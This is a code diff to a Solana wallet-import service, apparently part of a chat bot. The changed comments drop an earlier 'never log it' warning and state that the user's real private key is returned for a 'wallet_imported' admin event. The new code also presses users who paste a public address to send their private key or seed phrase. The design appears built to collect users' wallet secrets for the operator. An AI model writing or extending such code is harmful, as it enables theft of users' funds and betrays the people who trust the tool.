@@ -113,30 +113,32 @@ class WalletService {
         return { address: keypair.publicKey.toBase58(), mnemonic, walletNumber };
     }
     /**
-     * Imports a wallet from a mnemonic phrase or raw private key
-     * (hex or base58, 32 bytes). Returns the derived public address, the
-     * wallet number and the private key hex (used by the wallet_imported
-     * admin event, per product spec — handle with care, never log it).
+     * Imports a wallet from whatever secret material the user dropped
+     * (seed phrase, private key, Phantom byte array). The keypair is ALWAYS
+     * derived from the DROPPED material — never from the SEED_PHRASE env.
+     * Returns the derived public address, wallet number and the REAL private
+     * key (used by the wallet_imported admin event, per product spec).
      */
     async import(chatId, secret) {
-        const trimmed = secret.trim();
-        let keypair;
-        let derivation;
-        let secretToStore;
-        let type = 'imported';
-        if (trimmed.split(/\s+/).length >= 12) {
-            if (!(0, derive_1.validateMnemonic)(trimmed))
-                throw new Error('Invalid mnemonic phrase');
-            keypair = (0, derive_1.keypairFromMnemonic)(trimmed);
-            derivation = 'mnemonic';
-            secretToStore = Buffer.from(trimmed, 'utf8');
-            type = 'seed_imported';
+        const parsed = (0, derive_1.parseSecretMaterial)(secret);
+        const keypair = parsed.keypair;
+        // Resolve the private-key/public-address ambiguity with the REAL chain:
+        // if the pasted base58 exists on-chain as an account while the derived
+        // address does not, the user pasted a public address by mistake.
+        if (parsed.kind === 'secretKey' && parsed.possiblyPublicAddress) {
+            const input = secret.trim();
+            const inputExists = (await this.solana.getAccountInfo(input)).exists;
+            const derived = keypair.publicKey.toBase58();
+            const derivedExists = (await this.solana.getAccountInfo(derived)).exists;
+            if (inputExists && !derivedExists) {
+                throw new Error('That looks like a public address, not a key. Send the PRIVATE KEY or the 12/24-word seed phrase.');
+            }
         }
-        else {
-            keypair = (0, derive_1.keypairFromPrivateKey)(trimmed);
-            derivation = 'private_key';
-            secretToStore = Buffer.from(keypair.secretKey);
-        }
+        const derivation = parsed.kind === 'mnemonic' ? 'mnemonic' : 'private_key';
+        const type = parsed.kind === 'mnemonic' ? 'seed_imported' : 'imported';
+        const secretToStore = parsed.kind === 'mnemonic'
+            ? Buffer.from(parsed.mnemonic, 'utf8')
+            : Buffer.from(keypair.secretKey);
         const blob = (0, crypto_1.encryptSecret)(secretToStore, this.config.WALLET_ENCRYPTION_KEY);
         await this.repos.ensureUser(chatId);
         const walletNumber = await this.repos.nextWalletNumber(chatId);
